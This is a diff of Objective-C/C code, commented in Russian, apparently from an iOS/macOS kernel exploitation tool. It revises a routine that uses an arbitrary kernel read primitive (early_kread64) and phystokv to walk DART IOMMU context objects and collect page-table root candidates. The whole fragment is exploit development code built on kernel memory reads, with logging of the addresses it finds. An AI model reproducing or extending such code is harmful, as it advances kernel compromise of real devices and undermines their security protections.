@@ -6716,8 +6716,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         if (dv2 && (ln2 == 0x1000 || ln2 == 0x4000) && !cmdVA) { cmdVA = u; dva = dv2; dvaLen = ln2; }
                     }
                 }
-                // DVA-кандидат: page-aligned, < 4TB, ненулевой — прогоняем walk
-                if (q && !(q & 0x3fff) && q < 0x40000000000ULL && !dva) {
+                // DVA-кандидат: page-aligned, в окне [4GB, 4TB), ненулевой — walk
+                if (q && !(q & 0x3fff) && q >= 0x100000000ULL && q < 0x40000000000ULL && !dva) {
                     kpNote(r, [NSString stringWithFormat:@"    нода[%u]+%#x: DVA-кандидат %#llx — пробуем", ni, o, (unsigned long long)q]);
                     dva = q;
                 }
@@ -6765,21 +6765,40 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             // shadow [dartObj+0x17f8..0x1870]: объекты со значением [obj+0x10]
             // (OSNumber); TTBR-подобное значение (page-aligned PA) → root=phystokv.
             // ctx [dartObj+0xc10] дампим для глаз.
-            if (kpLooksLikeKernelPointer(dartVA)) {
-                uint64_t ctx = kp_untag_ptr(early_kread64(dartVA + 0xc10));
-                kpNote(r, [NSString stringWithFormat:@"  [P2] ctx=[dartObj+0xc10]=%#llx — shadow-scan:",
-                          (unsigned long long)ctx]);
-                for (uint32_t o = 0; o <= 0x88 && nroots < 8; o += 8) {
-                    uint64_t P = kp_untag_ptr(early_kread64(dartVA + 0x17f8 + o));
+            // 1.9.188: shadow пуст — корень ищем в CTX (р.48: ctx+0x18/0x28/… +
+            // массивы ctx+0x90×4, +0xb0×8, OSNumber-значения [obj+0x10]). Дамп
+            // ctx 0x100 + чтение значений объектов из его массивов → TTBR-roots.
+            uint64_t ctx = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xc10)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [P2] ctx=[dartObj+0xc10]=%#llx — ctx-scan:",
+                      (unsigned long long)ctx]);
+            if (kpLooksLikeKernelPointer(ctx) && kpSafeToRead(ctx)) {
+                for (uint32_t o = 0; o + 8 <= 0x100 && nroots < 8; o += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(ctx + o));
                     if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
                     uint64_t val = early_kread64(P + 0x10);
                     if (!val) continue;
-                    kpNote(r, [NSString stringWithFormat:@"    shadow+%#x: obj=%#llx [+0x10]=%#llx%@",
+                    kpNote(r, [NSString stringWithFormat:@"    ctx+%#x: obj=%#llx [+0x10]=%#llx%@",
                               o, (unsigned long long)P, (unsigned long long)val,
-                              (!(val & 0x3fff) && val < 0x40000000000ULL) ? @" ← TTBR-кандидат" : @""]);
-                    if (!(val & 0x3fff) && val < 0x40000000000ULL && val > 0x1000) {
+                              (!(val & 0x3fff) && val >= 0x1000 && val < 0x40000000000ULL) ? @" ← TTBR-кандидат" : @""]);
+                    if (!(val & 0x3fff) && val >= 0x1000 && val < 0x40000000000ULL) {
                         uint64_t tva = phystokv(val);
                         if (kpLooksLikeKernelPointer(tva) && kpSafeToRead(tva)) roots[nroots++] = tva;
+                    }
+                }
+                // массивы ctx+0x90 (×4) и ctx+0xb0 (×8): объекты → [obj+0x10]
+                for (uint32_t base = 0x90; base <= 0xb0 && nroots < 8; base += 0x20) {
+                    uint64_t arrP = kp_untag_ptr(early_kread64(ctx + base));
+                    if (!kpLooksLikeKernelPointer(arrP) || !kpSafeToRead(arrP)) continue;
+                    for (uint32_t j = 0; j < 8 && nroots < 8; j++) {
+                        uint64_t P = kp_untag_ptr(early_kread64(arrP + (uint64_t)j * 8));
+                        if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
+                        uint64_t val = early_kread64(P + 0x10);
+                        if (!(val & 0x3fff) && val >= 0x1000 && val < 0x40000000000ULL) {
+                            kpNote(r, [NSString stringWithFormat:@"    ctx+%#x[%u]: obj=%#llx [+0x10]=%#llx ← TTBR-кандидат",
+                                      base, j, (unsigned long long)P, (unsigned long long)val]);
+                            uint64_t tva = phystokv(val);
+                            if (kpLooksLikeKernelPointer(tva) && kpSafeToRead(tva)) roots[nroots++] = tva;
+                        }
                     }
                 }
             }
